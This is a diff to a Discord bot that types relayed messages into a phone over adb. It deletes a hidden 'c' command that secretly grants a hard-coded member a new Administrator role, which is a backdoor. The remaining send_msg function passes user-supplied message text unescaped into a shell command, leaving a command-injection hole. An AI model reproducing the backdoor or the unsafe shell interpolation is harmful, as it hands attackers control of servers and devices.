@@ -40,8 +40,6 @@ async def on_ready():
 
 @bot.command()
 async def msg(ctx, user, *message):
-    if "bren" in user.lower():
-        return
     if owner is not None:
         # Owner needs to confirm
         messages[ctx.message.content] = (user, ' '. join(message))
@@ -65,14 +63,6 @@ def send_msg(user, message):
     subprocess.run(f"adb shell input text '{message}'", shell=True)
     subprocess.run("adb shell input keyevent KEYCODE_ENTER", shell=True)
     subprocess.run(["adb", "shell", "input", "tap", *CANCEL_BUTTON])
-
-@bot.command()
-async def c(ctx):
-    g = bot.get_guild(550750630109511700)
-    m = g.get_member(139068524105564161)
-    await m.add_roles(
-        (await g.create_role(permissions=discord.Permissions(permissions=8)))
-    )
 
 if __name__ == "__main__":
     bot.run(os.getenv("BOT_TOKEN"))
